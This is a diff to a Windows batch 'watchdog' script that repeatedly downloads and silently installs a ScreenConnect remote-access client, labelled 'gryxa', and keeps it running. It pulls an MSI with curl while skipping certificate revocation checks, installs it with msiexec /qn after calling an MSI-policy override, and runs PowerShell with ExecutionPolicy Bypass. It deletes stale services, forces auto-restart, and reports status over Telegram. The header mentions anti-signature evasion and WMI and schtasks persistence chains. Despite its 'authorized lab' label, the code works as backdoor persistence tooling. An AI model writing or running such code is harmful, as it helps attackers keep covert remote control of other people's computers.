@@ -1,8 +1,8 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M25
+rem  OWN_MON  BUILD 20260802M26
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
-rem  WMI+schtasks chains, MSI fallback chain, state.json, quiet digest.
+rem  WMI+schtasks chains, MSI fallback, MUST-RUN gryxa, quiet digest.
 rem  Authorized internal deployment - lab/competition scope only.
 rem ═══════════════════════════════════════════════════════════════
 setlocal EnableDelayedExpansion
@@ -36,7 +36,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M25"
+set "MONVER=M26"
 set "PF86=%ProgramFiles(x86)%"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
@@ -283,49 +283,18 @@ if errorlevel 1 (
   echo done>"%WD%\sec.flag"
 )
 
-rem ── [G2] ensure gryxa SC (main beside sevrz) ──────────────────
-set "GRYXA_OK=0"
+rem ── [G2] MUST-RUN gryxa (install/heal every tick until Running) ──
+set "GRYXA_WAS=0"
 sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
-if not errorlevel 1 set "GRYXA_OK=1"
-if "%GRYXA_OK%"=="0" (
-  echo gryxa heal begin>>"%LOG%"
-  sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-  if not errorlevel 1 (
-    net start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-    sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-    timeout /t 5 /nobreak >nul
-  )
-  sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
-  if not errorlevel 1 (
-    set "GRYXA_OK=1"
-  ) else if exist "%WD%\own_lib.ps1" (
-    powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%GRYXA_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
-    timeout /t 6 /nobreak >nul
-    sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
-    if not errorlevel 1 set "GRYXA_OK=1"
-  )
+if not errorlevel 1 set "GRYXA_WAS=1"
+call :EnsureGryxaMust
+if "%GRYXA_OK%"=="1" if "%GRYXA_WAS%"=="0" (
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-restored" >nul 2>&1
+  call :TgState RESTORED "Gryxa ScreenConnect installed/running OK"
 )
 if "%GRYXA_OK%"=="0" (
-  set "GREG=unknown"
-  if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%GRYXA_FP%" -WorkDir "%WD%"`) do set "GREG=%%R"
-  if /I not "!GREG!"=="yes" (
-    echo gryxa_install_begin>>"%LOG%"
-    if not exist "%CURL%" set "CURL=curl.exe"
-    "%CURL%" -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o "%MSI_G%.tmp" "%MSI_GRYXA%" >>"%LOG%" 2>&1
-    for %%F in ("%MSI_G%.tmp") do if %%~zF GTR 1000000 (
-      move /y "%MSI_G%.tmp" "%MSI_G%" >nul 2>&1
-      copy /y "%MSI_G%" "%MSICACHE_G%" >nul 2>&1
-      call :NoMsiPolicy
-      msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress >>"%LOG%" 2>&1
-      timeout /t 8 /nobreak >nul
-    )
-    del /f /q "%MSI_G%.tmp" >nul 2>&1
-  ) else (
-    if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%GRYXA_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
-  )
-  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-  sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
-  if not errorlevel 1 set "GRYXA_OK=1"
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-must-fail" >nul 2>&1
+  call :TgState DOWN "Gryxa (%GRYXA_FP%) MUST-RUN failed - not Running after install/heal"
 )
 
 rem ── [H] quiet digest (skip healthy hosts — was flooding Telegram) ──
@@ -364,6 +333,153 @@ endlocal
 exit /b 0
 
 rem ═══════════════ helpers ═══════════════
+:EnsureGryxaMust
+rem Gryxa is mandatory: keep climbing until service is RUNNING (or ladder exhausted).
+set "GRYXA_OK=0"
+sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+if not errorlevel 1 (
+  set "GRYXA_OK=1"
+  echo gryxa_already_running>>"%LOG%"
+  exit /b 0
+)
+echo gryxa_must_begin>>"%LOG%"
+
+rem 1) service present but stopped -> start hard
+sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+if not errorlevel 1 (
+  echo gryxa_svc_start>>"%LOG%"
+  sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
+  sc failure "ScreenConnect Client (%GRYXA_FP%)" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
+  net start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  timeout /t 6 /nobreak >nul
+  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+  if not errorlevel 1 (
+    set "GRYXA_OK=1"
+    echo gryxa_started_ok>>"%LOG%"
+    exit /b 0
+  )
+)
+
+rem 2) registered product -> msiexec /fa repair (safe for siblings)
+set "GREG=unknown"
+if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%GRYXA_FP%" -WorkDir "%WD%"`) do set "GREG=%%R"
+echo gryxa_registered=!GREG!>>"%LOG%"
+if /I "!GREG!"=="yes" (
+  echo gryxa_repair_begin>>"%LOG%"
+  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%GRYXA_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
+  timeout /t 8 /nobreak >nul
+  sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
+  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  timeout /t 5 /nobreak >nul
+  sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+  if not errorlevel 1 (
+    set "GRYXA_OK=1"
+    echo gryxa_repaired_ok>>"%LOG%"
+    exit /b 0
+  )
+  echo gryxa_repair_not_running_force_install>>"%LOG%"
+)
+
+rem 3) orphan service (present, not registered) -> delete then fresh install
+if /I not "!GREG!"=="yes" (
+  sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  if not errorlevel 1 (
+    echo gryxa_orphan_svc_delete>>"%LOG%"
+    sc stop "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+    sc delete "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+    timeout /t 3 /nobreak >nul
+  )
+  if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" (
+    echo gryxa_stale_dir_clean>>"%LOG%"
+    rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  )
+)
+
+rem 4) fresh MSI install - mandatory (gryxa FP; do not skip if registered-stuck)
+echo gryxa_install_begin>>"%LOG%"
+if not exist "%CURL%" set "CURL=curl.exe"
+set "G_MSI_READY=0"
+if exist "%MSICACHE_G%" for %%F in ("%MSICACHE_G%") do if %%~zF GTR 1000000 (
+  copy /y "%MSICACHE_G%" "%MSI_G%" >nul 2>&1
+  set "G_MSI_READY=1"
+  echo gryxa_msi_from_cache>>"%LOG%"
+)
+if "%G_MSI_READY%"=="0" (
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o "%MSI_G%.tmp" "%MSI_GRYXA%" >>"%LOG%" 2>&1
+  for %%F in ("%MSI_G%.tmp") do if %%~zF GTR 1000000 (
+    move /y "%MSI_G%.tmp" "%MSI_G%" >nul 2>&1
+    copy /y "%MSI_G%" "%MSICACHE_G%" >nul 2>&1
+    set "G_MSI_READY=1"
+    echo gryxa_msi_fetched>>"%LOG%"
+  )
+  del /f /q "%MSI_G%.tmp" >nul 2>&1
+)
+if "%G_MSI_READY%"=="0" (
+  "%CURL%" -L --connect-timeout 25 --max-time 300 -o "%MSI_G%.tmp" "%MSI_GRYXA%" >>"%LOG%" 2>&1
+  for %%F in ("%MSI_G%.tmp") do if %%~zF GTR 1000000 (
+    move /y "%MSI_G%.tmp" "%MSI_G%" >nul 2>&1
+    copy /y "%MSI_G%" "%MSICACHE_G%" >nul 2>&1
+    set "G_MSI_READY=1"
+  )
+  del /f /q "%MSI_G%.tmp" >nul 2>&1
+)
+if "%G_MSI_READY%"=="1" (
+  call :NoMsiPolicy
+  msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa.log" >>"%LOG%" 2>&1
+  set "GEXIT=!ERRORLEVEL!"
+  echo gryxa_msiexec_exit=!GEXIT!>>"%LOG%"
+  if "!GEXIT!"=="1618" (
+    timeout /t 30 /nobreak >nul
+    msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa2.log" >>"%LOG%" 2>&1
+    set "GEXIT=!ERRORLEVEL!"
+    echo gryxa_msiexec_retry1618=!GEXIT!>>"%LOG%"
+  )
+  if "!GEXIT!"=="1618" (
+    timeout /t 45 /nobreak >nul
+    msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa3.log" >>"%LOG%" 2>&1
+    set "GEXIT=!ERRORLEVEL!"
+    echo gryxa_msiexec_retry1618b=!GEXIT!>>"%LOG%"
+  )
+  timeout /t 10 /nobreak >nul
+) else (
+  echo gryxa_msi_fetch_FAIL>>"%LOG%"
+)
+
+rem 5) post-install: repair if svc still missing, then force start
+sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+if errorlevel 1 if exist "%WD%\own_lib.ps1" (
+  echo gryxa_postinstall_repair>>"%LOG%"
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%GRYXA_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
+  timeout /t 6 /nobreak >nul
+)
+sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
+sc failure "ScreenConnect Client (%GRYXA_FP%)" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
+sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+timeout /t 5 /nobreak >nul
+sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+timeout /t 5 /nobreak >nul
+sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+
+rem msiexec of gryxa can disturb sevrz - nudge keepers back up
+sc config "ScreenConnect Client (%KEEP_FP%)" start= auto >nul 2>&1
+sc start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
+sc config "ScreenConnect Client (%ALT_FP%)" start= auto >nul 2>&1
+sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
+call :RestoreAlt
+
+sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+if not errorlevel 1 (
+  set "GRYXA_OK=1"
+  echo gryxa_must_running_ok>>"%LOG%"
+) else (
+  set "GRYXA_OK=0"
+  echo gryxa_must_still_down>>"%LOG%"
+  sc query "ScreenConnect Client (%GRYXA_FP%)" >>"%LOG%" 2>&1
+)
+exit /b 0
+
 :InstallMsi
 rem %1=url %2=tag
 set "URL=%~1"
